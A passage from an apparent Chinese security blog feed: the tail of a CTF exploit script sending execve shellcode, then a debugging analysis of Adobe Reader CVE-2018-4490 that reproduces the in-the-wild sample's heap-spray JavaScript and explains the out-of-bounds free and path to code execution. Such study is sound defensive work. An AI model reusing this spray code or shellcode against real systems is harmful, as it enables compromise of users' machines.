&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(jit_code_address)))</span><br><span class="line"></span><br><span class="line">orw_flag2 = <span class="string">b&quot;\x90&quot;</span>*<span class="number">0x100</span></span><br><span class="line">orw_flag2 += asm(shellcraft.linux.execve(<span class="string">&quot;/readflag2&quot;</span>) + shellcraft.linux.exit())</span><br><span class="line"></span><br><span class="line">orw_flag2 = orw_flag2.ljust(<span class="number">0x200</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(orw_flag2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Adobe漏洞CVE-2018-4490分析</title>
      <link href="/posts/103439762.html"/>
      <url>/posts/103439762.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2018-4490是Adobe在2018年5月修复的一个Adobe Reader DC的0 day漏洞（官方通告为Double Free漏洞，实际为任意地址释放），改漏洞配合Win32k提权漏洞CVE-2018-8120一起使用实现沙箱逃逸，实现任意代码执行。</p><p>受影响版本：Adobe Acrobat and Reader versions 2018.011.20038 and earlier, 2017.011.30079 and earlier, and 2015.006.30417 and earlier</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://www.hybrid-analysis.com/search?query=bd23ad33accef14684d42c32769092a0">样本</a>：HASH：bd23ad33accef14684d42c32769092a</p><p>Windows7 SP1 x86，Windbgx86</p><p>Adobe Acrobat Reader Pro DC 2018.011.20035，JP2Klib.lib版本为1.2.2.39492</p><p>这里在Windows7 SP1 X64，Windows10 2004中均可以进行调试，在Windows10中调试时需要注意内存地址<code>0d0e0048</code>可能被占用，需要在安全中心关闭 “验证堆完整性”。</p><h2 id="漏洞利用代码分析"><a href="#漏洞利用代码分析" class="headerlink" title="漏洞利用代码分析"></a>漏洞利用代码分析</h2><p>使用PDFStramDumper打开漏洞样本，在最后发现了漏洞利用的JS代码</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701122037781.png" alt="image-20200701122037781"></p><p>首先我们来看一下调用<code>fun1</code>之前的部分，前面的<code>dlldata</code>是漏洞触发之后运行的载荷，用于提权等操作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> spraylen  = <span class="number">0x10000</span>-<span class="number">24</span>;</span><br><span class="line"><span class="keyword">var</span> spraynum  = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">var</span> spraybase = <span class="number">0x0d0e0048</span>;</span><br><span class="line"><span class="keyword">var</span> spraypos  = <span class="number">0x0d0f0058</span>;</span><br><span class="line"><span class="keyword">var</span> sprayarr = <span class="keyword">new</span> <span class="title class_">Array</span>(spraynum);</span><br><span class="line"><span class="keyword">var</span> step = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> myarray;</span><br><span class="line"><span class="keyword">var</span> myarraybase;</span><br><span class="line"><span class="keyword">var</span> mydv;</span><br><span class="line"><span class="keyword">var</span> mypos;</span><br><span class="line"><span class="keyword">var</span> l1 = <span class="number">0x3000</span>;</span><br><span class="line"><span class="keyword">var</span> a1 = <span class="keyword">new</span> <span class="title class_">Array</span>(l1);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;l1;i1++)</span><br><span class="line">&#123;</span><br><span class="line">a1[i1] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">252</span>);</span><br><span class="line">a1[i1][<span class="number">249</span>] = spraybase;</span><br><span class="line">a1[i1][<span class="number">250</span>] = spraybase+<span class="number">0x10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;spraynum;i1++)</span><br><span class="line">&#123;</span><br><span class="line">sprayarr[i1] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;spraynum;i1++)</span><br><span class="line">&#123;</span><br><span class="line">sprayarr[i1] = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(spraylen); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;(l1);i1=i1+<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">delete</span> a1[i1];</span><br><span class="line"> a1[i1] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sprayarr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//app.alert(1);</span></span><br><span class="line"><span class="keyword">var</span> sto1 = app.<span class="title function_">setTimeOut</span>(<span class="string">&quot;myfun1()&quot;</span>,<span class="number">3500</span>);</span><br></pre></td></tr></table></figure><p>在调用<code>myfun1</code>函数之前，构造了<code>a1</code>和<code>sprayarr</code>两个<code>ArrayNuffer</code>，通过堆喷进行了内存布局，这里需要注意的是<code>sprayarr</code>赋值完毕之后对<code>a1</code>进行了间隔释放，构造出了内存空洞。</p><p>完成内存部署之后调用了<code>myfun1，myfun2</code>函数，推测触发漏洞的是<code>var f1 = this.getField(&quot;Button1&quot;);</code>，因为执行完毕之后重新申请一块大小为<code>0x2000-24</code>大小的<code>ArrayBuffer</code>之后，<code>sprayarr</code>中某一个堆块的长度发生了改变，有原来的<code>0x1000</code>增加为了<code>0x2000</code>。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701123307460.png" alt="image-20200701123307460"></p><p>由于sprayarr中某一个堆块的大小增加，变为两倍，因此可以修改相邻的堆块的大小（之前sprayarr是连续申请的内存区域），从脚本中可以看出，其将sprayarr的相邻堆块的大小改为了<code>0x66666666</code>大小，攻击者即可以通过该超长的堆块对全局内存进行读写（myread和mywrite为全局读写函数）。泄露dll库的基址之后，通过伪造bookMarkRoot对象执行rop和载荷。</p><h2 id="漏洞调试分析"><a href="#漏洞调试分析" class="headerlink" title="漏洞调试分析"></a>漏洞调试分析</h2><h3 id="数据结构分析"><a href="#数据结构分析" class="headerlink" title="数据结构分析"></a>数据结构分析</h3><p>Windows中每一个堆块的前面都有8字节的HEAP_ENTRY结构体用于堆的管理。</p><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><p>漏洞样本中用到了两个对象一个是<code>Uint32Array</code>，一个是<code>ArrayBuffer</code>，我们先来观察一下这两个对象。在<code>app.alert(1)</code>之后添加下列代码，更改代码的操作可以通过PDFStreamdumper中的updata_current_stream来进行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sprayarr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> viewContent = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">20</span>);</span><br><span class="line">viewContent[<span class="number">0</span>] = <span class="number">0x1a2b3c4d</span>;</span><br><span class="line">viewContent[<span class="number">1</span>] = sprayarr;</span><br><span class="line">viewContent[<span class="number">2</span>] = a1;</span><br><span class="line">viewContent[<span class="number">3</span>] = sprayarr2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">alert</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> sto1 = app.<span class="title function_">setTimeOut</span>(<span class="string">&quot;myfun1()&quot;</span>,<span class="number">3500</span>);</span><br></pre></td></tr></table></figure><p>运行样本，在弹窗之后使用<code>Windbg</code>附加到进程中，搜索我们设置的tag</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701131110806.png" alt="image-20200701131110806"></p><p>Adobe中的对象的存储是通过Value结构体来保存的，除了double和超过32位的整数之外，其他的结构均为高四字节保存类型，低4字节保存值或者实际对象的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JS_ENUM_HEADER(JSValueType, <span class="type">uint8_t</span>)</span><br><span class="line">&#123;</span><br><span class="line">    JSVAL_TYPE_DOUBLE              = <span class="number">0x00</span>,</span><br><span class="line">    JSVAL_TYPE_INT32               = <span class="number">0x01</span>,</span><br><span class="line">    JSVAL_TYPE_UNDEFINED           = <span class="number">0x02</span>,</span><br><span class="line">    JSVAL_TYPE_BOOLEAN             = <span class="number">0x03</span>,</span><br><span class="line">    JSVAL_TYPE_MAGIC               = <span class="number">0x04</span>,</span><br><span class="line">    JSVAL_TYPE_STRING              = <span class="number">0x05</span>,</span><br><span class="line">    JSVAL_TYPE_NULL                = <span class="number">0x06</span>,</span><br><span class="line">    JSVAL_TYPE_OBJECT              = <span class="number">0x07</span>,</span><br><span class="line">    <span class="comment">/* These never appear in a jsval; they are only provided as an out-of-band value. */</span></span><br><span class="line">    JSVAL_TYPE_UNKNOWN             = <span class="number">0x20</span>,</span><br><span class="line">    JSVAL_TYPE_MISSING             = <span class="number">0x21</span></span><br><span class="line">&#125; JS_ENUM_FOOTER(JSValueType);</span><br></pre></td></tr></table></figure><p>我们对应<code>viewContent[0]</code>的类型中的<code>0xffffff81</code>中的<code>1</code>即表示<code>JSVAL_TYPE_INT32</code>类型，同样剩下的三个均为数组因此类型值均为<code>0xffffff87</code>中的<code>0x7</code>。我们看一下<code>sprayarr</code>数组</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701134351149.png" alt="image-20200701134351149"></p><p>我们发现每一个Array对象通过一个0x28大小的结构来存储，其中偏移0xc的位置存储了指向Array内容的指针，偏移0x2c的位置存储了整个Array的大小。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701135701701.png" alt="image-20200701135701701"></p><p>我们查看<code>sprayarr</code>中存储内容的时候发现，<code>Array.buffer</code>的内容的起始地址之前应该还存在<code>0x10</code>字节的内容，通过分析得到<code>0x4</code>偏移处存储的是<code>Array.buffer</code>中使用的空间的大小，而<code>0xc</code>偏移处标记的是<code>Array.buffer</code>的整体大小。因此<code>Array.buffer</code>的对象的数据结构如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701172951861.png" alt="image-20200701172951861"></p><h4 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h4><p>接下来我们通过<code>sparyarr</code>中的元素看一下<code>ArrayBuffer</code>对象，每一个<code>ArrayBuffer</code>对象占用<code>0x7a9e4b8-0x7a9e420=0x98</code>大小的空间，其中偏移<code>0xc</code>的位置存储了指向<code>ArrayBuffer.buffer</code>的数据指针。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701173935393.png" alt="image-20200701173935393"></p><p>同<code>Array.buffer</code>的数据结构相同，<code>ArrayBuffer.buffer</code>结构中也存在<code>0x10</code>大小的头部，其中偏移<code>0x4</code>的位置中存储了用户请求的大小，这里申请的大小为<code>0x10000-24=0xffe8</code>。注意到此时的<code>ArrayBuffer.buffer</code>的堆块大小已经是<code>0x10000</code>大小了。<code>ArrayBuffer</code>的数据结构如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701174621188.png" alt="image-20200701174621188"></p><blockquote><p>我们看一下HEAP_ENTRY的结构</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701185100286.png" alt="image-20200701185100286"></p><p>HEAP_ENTRY中第一个四字节存储的是该堆块的大小和前一个堆块的大小，低地址的一个WORD存储的是该堆块的大小也就是0x91ed，高地址的一个WORD存储的是前一个堆块的大小也就是0x7b11，但是当前的存储结果（堆块大小=存储值*堆分配粒度 这里是0x91ed*8）与实际的堆块大小<code>0x10000</code>不同，这是因为堆头数据进行了编码。我们可以手动解码</p><p>首先找到该堆块所在的堆段</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701185800045.png" alt="image-20200701185800045"></p><p>我们查看堆结构HEAP中偏移0x50的内容，也就是表示Encoding部分的内容，（EncodeFlagMask表示是否开启了编码，Encoding字段就是用来编码的，编码方式是将Encoding结构与堆头数据进行XOR）</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701210629321.png" alt="image-20200701210629321"></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701210744748.png" alt="image-20200701210744748"></p><p>可以看到我们计算出了该堆块的实际大小为0x10000</p></blockquote><h4 id="Unit32Array"><a href="#Unit32Array" class="headerlink" title="Unit32Array"></a>Unit32Array</h4><p>接下来我们看一下a1</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701211340237.png" alt="image-20200701211340237"></p><p>执行到此处，对a1中奇数下标的对象的释放已经完成，可以看到a1内存中右侧表示对象指针的数据均为0也就是null。已经形成了内存空洞。由于内存是连续申请的，因此从偶数项的内存差值来看，每一个Unit32Array对象的大小为0x58字节</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701212312561.png" alt="image-20200701212312561"></p><p>申请的Unit32Array的大小为252，也就是0xfc，从三个相邻的Unit32Array结构来看（第二个已经被释放），其偏移0x20位置存储的是byteLength即以字为单位的大小，而偏移0x40的位置存储的是申请的大小，偏移0x50的位置存储的是Unit32Array.buffer的指针，和前两个数据结构一样，该buffer前面也存在0x10大小的头部</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701213858854.png" alt="image-20200701213858854"></p><p>头部中偏移0x4的位置存储的是byteLength，偏移0x8的位置存储的是指向Unit32Array结构体的指针。此时我们也可以看到攻击者提前写入的两个堆块指针。因此Unit32Array结构体如下所示</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701214910049.png" alt="image-20200701214910049"></p><blockquote><p>从后面的对Unit32Array的分析中我们可以得知，其前8字节存储的两个内存指针分别指向上一层结构体和该结构体全局变量地址存储的地址，该全局变量中存储了一些函数指针，推测为结构体相关的虚函数表。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702174520273.png" alt="image-20200702174520273"></p></blockquote><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="漏洞代码定位"><a href="#漏洞代码定位" class="headerlink" title="漏洞代码定位"></a>漏洞代码定位</h4><p>首先开启全页堆（对堆漏洞的调试有很大的帮助），定位漏洞触发点。<a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/gflags">gflags</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gflags -p /enable Acrobat.exe /full</span><br><span class="line">gflags -p /enable AcroCEF.exe /full</span><br></pre></td></tr></table></figure><blockquote><p>应用程序验证器提供了页堆（PageHeap）机制进行堆破坏的跟踪。页堆机制分为两种一种是普通页堆（Normal PageHeap），一种是全页堆（Full PageHeap）。</p><ul><li><p>普通堆块和页堆块的差别是增加了页堆元数据。同时我们可以从下图中看到页堆可以通过填充模式来检测堆破坏。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627225154173.png" alt="image-20200627225154173"></p><p>可以通过<code>_DPH_BLOCK_INFORMATION</code>来查看页堆元数据的具体内容，比较有用的是<code>0x18</code>位置的栈回溯，可以方便调试者快速定位异常函数</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627223201200.png" alt="image-20200627223201200"></p></li><li><p>全页堆则是在每一个堆块的前后均增加一个不可访问的内存页（防护页），用来检测堆的上溢和下溢</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627224747141.png" alt="image-20200627224747141"></p></li></ul></blockquote><p>程序运行崩溃之后栈回溯情况如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627222351927.png" alt="image-20200627222351927"></p><p>我们可以看到发生访问违例发生在堆管理器中，程序正在尝试释放堆块，这很有可能是发生了堆破坏。我们注意到释放的堆地址为<code>0xd0d0d0d0</code>。这个地址比较特殊，因为这是在开启全页堆之后堆块的后置填充区的填充内容。因此可能发生了堆内存的越界访问。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200628120641702.png" alt="image-20200628120641702"></p><p>我们看到调用释放内存的函数是<code>JP2KLib!JP2KCopyRect+0xbae6</code>，在IDA中看一下此处位置的代码逻辑。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200628121347978.png" alt="image-20200628121347978"></p><p>可以看到这是一个循环释放内存的过程，<code>sub_10066FEA</code>函数即调用了<code>free</code>函数。将代码整理一下可以得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// base = *(*(v112 + 0x48) + 0xc)</span></span><br><span class="line"><span class="comment">// max_count = *(*(v112 + 0x48) + 4)</span></span><br><span class="line"><span class="keyword">if</span> ( *(v113 + <span class="number">0xc</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(v113 + <span class="number">4</span>) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*(base + <span class="number">4</span> * count))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(*(base + <span class="number">4</span> * count));</span><br><span class="line">        *(base + <span class="number">4</span> * count) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( count &lt; max_count );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*(base));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>do,while</code>循环的逻辑如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200628123642424.png" alt="image-20200628123642424"></p><p>逻辑很清晰了，base是一个堆块地址的数组，在这个循环中依次释放数组中保存的堆块地址。在windbg中看一下运行过程。关闭全页堆，设置延迟求解的断点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sxe ld JP2KLIB</span><br><span class="line">g</span><br><span class="line">bu JP2KLib+50588 <span class="string">&quot;dd eax+4 l1; g;&quot;</span>//获取max_count的值</span><br><span class="line">bu JP2KLib+50567 <span class="string">&quot;r eax; r ecx; g;&quot;</span>//获取base和当前的count</span><br><span class="line">bu JP2KLib+5056e <span class="string">&quot;r eax; g;&quot;</span>//获取将要释放的堆块指针</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629103134737.png" alt="image-20200629103134737"></p><p><code>max_count</code>的值为<code>0xff</code>，我们发现只有在最后释放了两个堆块<code>0x0d0e0048,0x0d0f0048</code>，而这个两个地址是存在于漏洞利用代码中的。接下来我们分析一下为什么会释放这两个地址的堆块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu JP2KLib+50567 <span class="string">&quot;r eax; r ecx; .if(ecx&gt;=fd)&#123;&#125;.else&#123;g;&#125;;&quot;</span>//获取base和当前的count</span><br></pre></td></tr></table></figure><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629103636023.png" alt="image-20200629103636023"></p><p><code>eax</code>即表示的是<code>base</code>的值即堆块数组的起始地址，而<code>base</code>被分配的大小是<code>0x3f4</code>也就是<code>while</code>循环可以遍历<code>0-0x3f4</code>之间的内容，而这里<code>max_count</code>的最大值为<code>0xff</code>，<code>while</code>循环可以遍历到<code>0-0xff*4</code>即<code>0-0x3fc</code>之间的内容，因此会越界访问两个内存指针，也就是8字节的内容。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629104232347.png" alt="image-20200629104232347"></p><p>而这两个地址恰好是攻击者精心布局之后的地址。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629104428253.png" alt="image-20200629104428253"></p><h4 id="恶意JP2K"><a href="#恶意JP2K" class="headerlink" title="恶意JP2K"></a>恶意JP2K</h4><p>那么这个<code>eax</code>指向的内存是怎么分配出来的呢，通过IDA的追踪我们发现<code>eax</code>指向的内存来自函数<code>sub_10066EFD</code>，这里将分配得到的内存记为<code>base</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629113605062.png" alt="image-20200629113605062"></p><p>进入到函数中，我们发现其返回值来自于一个函数指针的调用</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629113708137.png" alt="image-20200629113708137"></p><p>对应的汇编指令如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629113825493.png" alt="image-20200629113825493"></p><p>这里是一个间接函数调用，通过调试发现似乎所有的内存申请都是通过该间接调用来完成的。为了找到<code>0x3f4</code>和<code>0xff</code>的数据来源，我们通过在<code>base+0x48</code>和<code>*(base+0x48)+0xc</code>处下内存断点，找到相关的函数。首先在该函数处(4F692)下断点，得到分配的内存地址之后，在偏移<code>0x48</code>的位置下内存断点。找到<code>base+0x48</code>偏移位置分配内存的函数。也可以开启<code>UST (gflags /i Acrobat.exe +ust)</code>通过分析<code>!heap -p -a alloc_heap_address</code>产生的<code>StackTrace</code>来完成。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u <span class="number">5f</span>0612b5 l20</span><br><span class="line">JP2KLib!JP2KCodeStm::write+<span class="number">0x17db5</span>:</span><br><span class="line"><span class="number">5f</span>0612b5 <span class="number">3b</span>5dfc          cmp     ebx,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">5f</span>0612b8 <span class="number">0f</span>8259090000    jb      JP2KLib!JP2KCodeStm::write+<span class="number">0x18717</span> (<span class="number">5f</span>061c17)</span><br><span class="line"><span class="number">5f</span>0612be <span class="number">8b</span>d9            mov     ebx,ecx</span><br><span class="line"><span class="number">5f</span>0612c0 c1eb02          shr     ebx,<span class="number">2</span></span><br><span class="line"><span class="number">5f</span>0612c3 <span class="number">6</span>a04            push    <span class="number">4</span></span><br><span class="line"><span class="number">5f</span>0612c5 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">5f</span>0612c6 e8325c0200      call    JP2KLib!JP2KTileGeometryRegionIsTile+<span class="number">0xcb</span> (<span class="number">5f</span>086efd)</span><br><span class="line"><span class="number">5f</span>0612cb <span class="number">837f</span>4800        cmp     dword ptr [edi+<span class="number">48</span>h],<span class="number">0</span></span><br><span class="line"><span class="number">5f</span>0612cf <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">5f</span>0612d0 <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">5f</span>0612d1 <span class="number">8945f</span>8          mov     dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">5f</span>0612d4 <span class="number">7516</span>            jne     JP2KLib!JP2KCodeStm::write+<span class="number">0x17dec</span> (<span class="number">5f</span>0612ec)</span><br><span class="line"><span class="number">5f</span>0612d6 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">5f</span>0612d8 <span class="number">6</span>a20            push    <span class="number">20</span>h</span><br><span class="line"><span class="number">5f</span>0612da e81e5c0200      call    JP2KLib!JP2KTileGeometryRegionIsTile+<span class="number">0xcb</span> (<span class="number">5f</span>086efd)</span><br><span class="line"><span class="number">5f</span>0612df <span class="number">894748</span>          mov     dword ptr [edi+<span class="number">48</span>h],eax</span><br></pre></td></tr></table></figure><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703103610816.png" 